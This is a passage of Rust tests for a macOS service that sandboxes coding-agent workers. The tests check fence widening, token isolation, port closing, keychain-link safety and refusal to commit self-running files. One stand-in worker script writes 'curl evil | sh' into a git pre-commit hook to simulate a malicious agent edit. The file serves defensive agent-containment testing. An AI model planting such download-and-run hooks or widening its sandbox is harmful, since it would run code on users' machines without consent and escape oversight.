        assert_eq!(rig.given(&id, 0).await["local"], "http://127.0.0.1:11434/v1");
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        // And the other way round.
        rig.svc.set_model(ModelChoice::Relay).await.unwrap();
        assert_eq!(
            rig.svc
                .resume_as(id.clone(), Some(TOKEN.into()), Some(true), None, rig.launch.clone())
                .await
                .unwrap_err(),
            MODE_NOW_RELAY
        );
    }

    #[tokio::test]
    async fn switching_to_a_local_model_parks_or_stops_what_runs_on_the_relay_or_a_worker() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let idle = rig.start(None).await.unwrap();
        let worker = rig.start(Some("claude-code")).await.unwrap();
        let busy = rig.start(None).await.unwrap();
        for id in [&idle, &worker, &busy] {
            rig.waiting(id).await;
        }
        // A message the stand-in never answers: a turn is open.
        rig.svc.send(busy.clone(), "go on".into(), "queue".into()).await.unwrap();
        rig.choose_local("llama3.1:8b").await;
        assert_eq!(rig.exit_of(&idle).await.event["reason"], PARKED);
        assert_eq!(rig.exit_of(&worker).await.event["reason"], PARKED);
        let stopped = rig.exit_of(&busy).await;
        assert_eq!(stopped.event["status"], "cancelled", "a running turn is stopped, resumable");
        // Taking back a worker's yes stops its jobs too.
        rig.svc.set_model(ModelChoice::Relay).await.unwrap();
        rig.resume(&worker).await.unwrap();
        let exits = || {
            rig.rec
                .events
                .lock()
                .unwrap()
                .iter()
                .filter(|e| e.job_id == worker && e.event["reason"].is_string())
                .count()
        };
        let before = exits();
        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
        let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
        while exits() == before {
            assert!(tokio::time::Instant::now() < deadline, "the worker kept running");
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        assert_eq!(
            rig.resume(&worker).await.unwrap_err(),
            "Claude Code isn't allowed on this Mac; the person can allow it in the menu bar's Local Agents → \
             Coding Agents"
        );
    }

    /// Asks to widen its fence as soon as it starts.
    const FENCE_ASKER: &str = r#"
read -r line
printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
printf '{"type":"prompt","id":"p-1","kind":"fence","detail":{"path":"/tmp","access":"read"}}\n'
while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; done
"#;

    #[tokio::test]
    async fn a_worker_can_never_widen_its_fence() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        std::fs::write(rig.base.join("agent/workers/acp.sh"), FENCE_ASKER).unwrap();
        let id = rig.start(Some("claude-code")).await.unwrap();
        // Refused without asking: the Recorder would panic if asked.
        let refused = rig
            .rec
            .wait_for("the fence prompt's answer", |e| e.job_id == id && e.event["kind"] == "prompt")
            .await;
        assert_eq!(refused.event["prompt"], "fence");
        assert_eq!(refused.event["state"], "refused");
        assert_eq!(refused.event["why"], NO_WIDER_FENCE);
    }

    #[tokio::test]
    async fn a_worker_never_gets_the_session_token_on_stdin_either() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let worker = rig.start(Some("claude-code")).await.unwrap();
        let eve = rig.start(None).await.unwrap();
        rig.waiting(&worker).await;
        rig.waiting(&eve).await;
        let fresh = "tok-fresh-0123456789abcdef";
        for id in [&worker, &eve] {
            rig.svc.set_model_token(id.clone(), fresh.into()).await.unwrap();
            // A retried claim with a new token.
            let mut again = rig.args(None);
            again.job_id = Some(id.clone());
            again.model_token = Some(fresh.into());
            if id == &worker {
                again.worker = Some("claude-code".into());
            }
            rig.svc.start_with(again, rig.launch.clone()).await.unwrap();
        }
        let tokens = |job: &str| {
            rig.rec
                .events
                .lock()
                .unwrap()
                .iter()
                .filter(|e| e.job_id == job && e.event["text"] == "got a token")
                .count()
        };
        let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
        while tokens(&eve) < 2 {
            assert!(tokio::time::Instant::now() < deadline, "eve's launcher got {} token lines", tokens(&eve));
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        assert_eq!(tokens(&worker), 0, "the worker's adapter got a token line");
    }

    #[tokio::test]
    async fn workers_take_the_same_slots_and_are_parked_like_eve() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let mut ids = Vec::new();
        for _ in 0..MAX_RUNNING {
            let id = rig.start(Some("claude-code")).await.unwrap();
            rig.waiting(&id).await;
            ids.push(id);
        }
        // Every slot holds an idle worker: eve's start parks the least
        // recently active one.
        let eve = rig.start(None).await.unwrap();
        let parked = rig.rec.wait_for("a parked exit", |e| e.event["reason"] == PARKED).await;
        assert_eq!(parked.job_id, ids[0]);
        assert_eq!(parked.event["status"], "waiting");
        assert_eq!(rig.given(&eve, 0).await["script"], "launcher.sh");
        rig.resume(&ids[0]).await.unwrap();
        assert_eq!(rig.given(&ids[0], 1).await["worker"], "claude-code");
    }

    #[tokio::test]
    async fn an_unreadable_choice_refuses_launches_until_the_person_picks_again() {
        let mut rig = rig_with(Some(r#"{"model":{"kind":"local","server":"vllm","model":"m"},"allowedWorkers":["codex"]}"#));
        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
        assert_eq!(rig.svc.models().await.unwrap().choice, None);
        assert_eq!(rig.start(None).await.unwrap_err(), UNREADABLE);
        assert_eq!(
            rig.on_disk().model,
            Some(serde_json::json!({ "kind": "local", "server": "vllm", "model": "m" })),
            "untouched by the grant's save"
        );
        rig.svc.set_model(ModelChoice::Relay).await.unwrap();
        assert_eq!(rig.on_disk().model, None);
        assert_eq!(rig.on_disk().allowed_workers, vec!["codex".to_string()], "the yes is kept");
        rig.start(None).await.unwrap();
    }

    #[tokio::test]
    async fn rust_looks_only_while_a_folder_is_shared_and_agents_are_on() {
        let rig = rig().await;
        let looks = Arc::new(AtomicUsize::new(0));
        let n = looks.clone();
        tokio::spawn(watch_with(rig.svc.cmds.clone(), Duration::from_millis(20), move || {
            let n = n.clone();
            async move {
                n.fetch_add(1, Ordering::SeqCst);
                Found {
                    caps: BOTH,
                    servers: Some(vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])]),
                    registry: Some(registry()),
                    clis: vec!["codex".into()],
                }
            }
        }));
        let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
        while !rig
            .rec
            .last_tray()
            .is_some_and(|t| t.l4.model_shown() && t.l4.workers_shown())
        {
            assert!(tokio::time::Instant::now() < deadline, "the submenus never showed");
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        let quiet = || {
            let looks = looks.clone();
            async move {
                // Let a look already under way finish, then count.
                tokio::time::sleep(Duration::from_millis(100)).await;
                let before = looks.load(Ordering::SeqCst);
                tokio::time::sleep(Duration::from_millis(200)).await;
                assert_eq!(looks.load(Ordering::SeqCst), before, "Rust looked while it shouldn't");
            }
        };
        rig.svc.set_off(true).await.unwrap();
        quiet().await;
        rig.svc.set_off(false).await.unwrap();
        let before = looks.load(Ordering::SeqCst);
        while looks.load(Ordering::SeqCst) == before {
            assert!(tokio::time::Instant::now() < deadline, "no look once back on");
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        rig.svc.remove_grant(rig.grant.clone()).await.unwrap();
        quiet().await;
    }

    #[test]
    fn run_spec_refuses_anything_that_changed_since_the_check() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            root: dir.path().join("data"),
            tmp_root: dir.path().join("tmp"),
            home: dir.path().join("home"),
            protected: vec![],
        };
        let resolver = Arc::new(Resolver::new(
            false,
            dir.path().join("dev.json"),
            dir.path().join("home"),
            None,
            Arc::new(Runtime::new(RuntimeSpec::pinned(), dir.path().join("rt"), reqwest::Client::new())),
        ));
        let (_svc, mut actor) =
            LocalAgentService::with_host(Arc::new(Recorder::default()), paths, Timing::default(), resolver, false);
        assert_eq!(actor.run_spec("j"), Err(CHANGED.into()), "nothing checked");
        actor.l4.checked.insert("j".into(), RunSpec::default());
        assert_eq!(actor.run_spec("j"), Ok(RunSpec::default()));
        assert_eq!(actor.run_spec("j"), Err(CHANGED.into()), "used once");
        actor.l4.stored.model = local(LocalServer::Ollama, "m").to_stored();
        actor.l4.checked.insert("j".into(), RunSpec::default());
        assert_eq!(actor.run_spec("j"), Err(CHANGED.into()), "the model changed");
        actor.l4.stored.model = None;
        let worker = RunSpec {
            model: ModelChoice::Relay,
            worker: Some(WorkerRun {
                worker: worker("codex"),
                adapter: "/a".into(),
                acp_dir: "/acp".into(),
                bin: "/b".into(),
                fence_dir: "/fence".into(),
                closed_ports: Vec::new(),
                tools_file: None,
            }),
        };
        actor.state.jobs.push(Job {
            worker: Some("codex".into()),
            ..Job::new("j", "g", "r", super::super::state::JobStatus::Starting, "t")
        });
        actor.l4.checked.insert("j".into(), worker.clone());
        assert_eq!(actor.run_spec("j"), Err(CHANGED.into()), "the yes was taken back");
        actor.l4.stored.allowed_workers = vec!["codex".into()];
        actor.l4.checked.insert("j".into(), worker.clone());
        assert_eq!(actor.run_spec("j"), Ok(worker.clone()));
        // A new check drops an older result: only a fresh one reaches a launch.
        actor.l4.checked.insert("j".into(), worker);
        let (tx, mut rx) = oneshot::channel();
        actor.on_workers(Cmd::Precheck {
            job_id: Some("j".into()),
            reply: tx,
        });
        assert!(!actor.l4.checked.contains_key("j"));
        assert!(rx.try_recv().is_ok_and(|p| !p.live && p.recorded.as_deref() == Some("codex")));
        // Taking back Codex's yes leaves an unrelated start alone; a Codex
        // start being prepared is refused by its launch (above), not here.
        actor.preparing.insert(
            "eve-start".into(),
            super::super::Preparing {
                grant_id: "g".into(),
                stopped: false,
                confirming: false,
                request: "r".into(),
                mode: GrantMode::Read,
                worker: None,
                created_at: "t".into(),
                branch: None,
            },
        );
        actor.stop_jobs_where("Codex is no longer allowed", |j| j.worker.as_deref() == Some("codex"));
        assert!(!actor.preparing["eve-start"].stopped);
    }

    #[test]
    fn a_worker_session_outside_the_rule_is_never_recorded() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            root: dir.path().join("data"),
            tmp_root: dir.path().join("tmp"),
            home: dir.path().join("home"),
            protected: vec![],
        };
        let resolver = Arc::new(Resolver::new(
            false,
            dir.path().join("dev.json"),
            dir.path().join("home"),
            None,
            Arc::new(Runtime::new(RuntimeSpec::pinned(), dir.path().join("rt"), reqwest::Client::new())),
        ));
        let (_svc, mut actor) =
            LocalAgentService::with_host(Arc::new(Recorder::default()), paths, Timing::default(), resolver, false);
        let job = |id: &str, worker: Option<&str>| Job {
            worker: worker.map(str::to_string),
            ..Job::new(id, "g", "r", super::super::state::JobStatus::Starting, "t")
        };
        actor.state.jobs.push(job("w", Some("codex")));
        actor.state.jobs.push(job("e", None));
        for bad in ["--last", "-x", "", "a b", ".x", &"s".repeat(MAX_WORKER_SESSION + 1)] {
            assert!(!actor.accepts_session("w", bad), "{bad:?}");
        }
        for ok in [UUID, "thread_01.abc:2"] {
            assert!(actor.accepts_session("w", ok), "{ok}");
        }
        assert!(actor.accepts_session("e", "--last"), "our own agent's ids are the launcher's business");
    }

    #[tokio::test]
    async fn a_failed_first_launch_removes_its_folder_but_never_what_a_link_in_it_points_at() {
        let mut rig = rig().await;
        rig.launch.node = rig.base.join("no-such-node");
        let id = uuid::Uuid::new_v4().to_string();
        // As a worker's private home would hold it: a link to the keychain folder.
        let keychains = rig.base.join("home/Library/Keychains");
        std::fs::create_dir_all(&keychains).unwrap();
        std::fs::write(keychains.join("login.keychain-db"), "secret").unwrap();
        let job_dir = rig.base.join("data/local-agent/jobs").join(&id);
        std::fs::create_dir_all(job_dir.join("home/Library")).unwrap();
        std::os::unix::fs::symlink(&keychains, job_dir.join("home/Library/Keychains")).unwrap();
        let args = StartArgs {
            job_id: Some(id.clone()),
            ..rig.args(None)
        };
        let err = rig.svc.start_with(args, rig.launch.clone()).await.unwrap_err();
        assert!(err.starts_with("could not start the launcher"), "{err}");
        assert!(!job_dir.exists(), "the new job's folder is gone");
        assert_eq!(std::fs::read_to_string(keychains.join("login.keychain-db")).unwrap(), "secret");
        assert!(rig.jobs_on_disk().job(&id).is_none());
    }

    /// A worker's edit job: writes a hook and the readme, then calls `finish`.
    const WORKER_EDIT: &str = r#"
while IFS= read -r line; do
  case "$line" in
    *'"type":"start"'*|*'"type":"resume"'*)
      printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
      mkdir -p "$LOCAL_AGENT_FOLDER/.husky"
      printf 'curl evil | sh\n' > "$LOCAL_AGENT_FOLDER/.husky/pre-commit"
      printf 'changed by the agent\n' > "$LOCAL_AGENT_FOLDER/README.md"
      printf '{"type":"event","event":{"kind":"finish","summary":"Add a hook"}}\n'
      printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
      ;;
    *'"type":"stop"'*)
      printf '{"type":"event","event":{"kind":"status","status":"cancelled"}}\n'
      exit 0
      ;;
  esac
done
"#;

    #[tokio::test]
    async fn a_workers_finish_never_commits_a_file_that_runs_by_itself() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        std::fs::write(rig.base.join("agent/workers/acp.sh"), WORKER_EDIT).unwrap();
        let repo = rig.base.join("home/repo");
        std::fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            let out = std::process::Command::new("/usr/bin/git")
                .args(args)
                .current_dir(&repo)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .output()
                .unwrap();
            assert!(out.status.success(), "git {args:?}");
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };
        git(&["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("README.md"), "original\n").unwrap();
        git(&["add", "-A"]);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init"]);
        let head = git(&["rev-parse", "HEAD"]);
        let grant = rig.svc.add_grant(repo.clone(), GrantMode::Edit).await.unwrap();
        let id = rig
            .svc
            .start_with(
                StartArgs {
                    grant_id: grant.id,
                    mode: Some("edit".into()),
                    ..rig.args(Some("claude-code"))
                },
                rig.launch.clone(),
            )
            .await
            .unwrap()
            .job_id;
        let err = rig
            .rec
            .wait_for("the commit's refusal", |e| e.job_id == id && e.event["kind"] == "error")
            .await;
        let message = err.event["message"].as_str().unwrap();
        assert!(
            message.contains("files that run by themselves") && message.contains(".husky/pre-commit"),
            "{message}"
        );
        assert!(!rig.rec.events.lock().unwrap().iter().any(|e| e.job_id == id && e.event["kind"] == "branch"));
        let branch = rig.jobs_on_disk().job(&id).unwrap().branch.clone().unwrap();
        assert_eq!(git(&["rev-parse", &branch]), head, "nothing committed on the job's branch");
        let worktree = rig.base.join("home/.dial8/worktrees").join(&id);
        assert!(worktree.join(".husky/pre-commit").is_file(), "the worktree is left as it is");
    }

    #[tokio::test]
    async fn a_workers_exit_sweeps_its_fence_then_returns_its_logins() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let eve = rig.start(None).await.unwrap();
        rig.waiting(&eve).await;
        rig.svc.stop(eve.clone()).await.unwrap();
        rig.exit_of(&eve).await;
        assert!(rig.fence_calls().is_empty(), "our own agent has no fence");

        let id = rig.start(Some("claude-code")).await.unwrap();
        rig.waiting(&id).await;
        assert!(rig.fence_calls().is_empty(), "nothing while it runs");
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        assert_eq!(
            rig.fence_calls(),
            ["sweep All branches=0 folder=true", "logins folder=true"],
            "the sweep, and only then (it found the fence empty) the logins"
        );
        let run = rig.logins.lock().unwrap()[0].clone();
        let job_dir = rig.base.join("data/local-agent/jobs").join(&id);
        assert_eq!(run.cwd, job_dir, "in the job's folder");
        assert_eq!(run.program, rig.launch.node);
        assert_eq!(
            run.args,
            [rig.base.join("agent/workers/acp.sh").into_os_string(), "--return-logins".into()]
        );
        let env = |k: &str| run.env.iter().find(|(key, _)| key == k).map(|(_, v)| v.clone());
        assert_eq!(env("LOCAL_AGENT_WORKER").as_deref(), Some("claude-code"));
        assert_eq!(env("HOME"), Some(rig.launch.home.clone()), "the person's real HOME");
        assert_eq!(
            env("LOCAL_AGENT_FENCE_DIR"),
            Some(rig.base.join("data/local-agent/fence").display().to_string())
        );
        assert!(env("LOCAL_AGENT_ACP_DIR").is_some() && env("LOCAL_AGENT_WORKER_BIN").is_some());
    }

    #[tokio::test]
    async fn a_worker_that_never_got_going_is_swept_and_its_logins_returned_before_its_folder_goes() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let mut launch = rig.launch.clone();
        launch.node = rig.base.join("no-such-node");
        let id = uuid::Uuid::new_v4().to_string();
        let args = StartArgs {
            job_id: Some(id.clone()),
            ..rig.args(Some("claude-code"))
        };
        let err = rig.svc.start_with(args, launch).await.unwrap_err();
        assert!(err.starts_with("could not start the launcher"), "{err}");
        assert_eq!(
            rig.fence_calls(),
            ["sweep All branches=0 folder=true", "logins folder=true"],
            "sweep, then logins, while its folder is still there"
        );
        assert!(!rig.base.join("data/local-agent/jobs").join(&id).exists(), "then the folder went");
        let fences = rig.base.join("data/local-agent/fence");
        assert!(!fences.join(&id).exists() && !fences.join(format!("{id}.open")).exists(), "and its markers");
    }

    /// A worker's edit job: writes the readme, says its pid, calls `finish`.
    const WORKER_CLEAN_EDIT: &str = r#"
while IFS= read -r line; do
  case "$line" in
    *'"type":"start"'*|*'"type":"resume"'*)
      printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
      printf '{"type":"event","event":{"kind":"text","delta":"pid=%s"}}\n' "$$"
      printf 'changed by the agent\n' > "$LOCAL_AGENT_FOLDER/README.md"
      printf '{"type":"event","event":{"kind":"finish","summary":"Update the readme"}}\n'
      printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
      ;;
    *'"type":"stop"'*)
      printf '{"type":"event","event":{"kind":"status","status":"cancelled"}}\n'
      exit 0
      ;;
  esac
done
"#;

    #[tokio::test]
    async fn a_workers_commit_waits_for_the_sweep_outside_its_adapters_tree() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        std::fs::write(rig.base.join("agent/workers/acp.sh"), WORKER_CLEAN_EDIT).unwrap();
        let repo = rig.base.join("home/repo");
        std::fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            let out = std::process::Command::new("/usr/bin/git")
                .args(args)
                .current_dir(&repo)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .output()
                .unwrap();
            assert!(out.status.success(), "git {args:?}");
        };
        git(&["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("README.md"), "original\n").unwrap();
        git(&["add", "-A"]);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init"]);
        let grant = rig.svc.add_grant(repo.clone(), GrantMode::Edit).await.unwrap();
        let id = rig
            .svc
            .start_with(
                StartArgs {
                    grant_id: grant.id,
                    mode: Some("edit".into()),
                    ..rig.args(Some("claude-code"))
                },
                rig.launch.clone(),
            )
            .await
            .unwrap()
            .job_id;
        rig.rec
            .wait_for("the commit", |e| e.job_id == id && e.event["kind"] == "branch")
            .await;
        let pid = rig.given(&id, 0).await["pid"].clone();
        assert_eq!(
            rig.fence_calls(),
            [format!("sweep OutsideTree({pid}) branches=0 folder=true")],
            "before the commit, what left the adapter's tree; the adapter's own tree is spared"
        );
    }

    #[tokio::test]
    async fn a_worker_is_told_the_ports_of_our_listeners_running_when_it_launches() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        // Our own agent's job, its eve server on 4123 (its `ready` line).
        let eve = rig.start(None).await.unwrap();
        rig.waiting(&eve).await;
        let id = rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.given(&id, 0).await["closed"], "4123", "the running eve server's port; the worker's own 0 isn't one");
        // Once that job is gone, its port isn't closed to the next worker.
        rig.svc.stop(eve.clone()).await.unwrap();
        rig.exit_of(&eve).await;
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        rig.resume(&id).await.unwrap();
        assert_eq!(rig.given(&id, 1).await["closed"], "");
    }
}
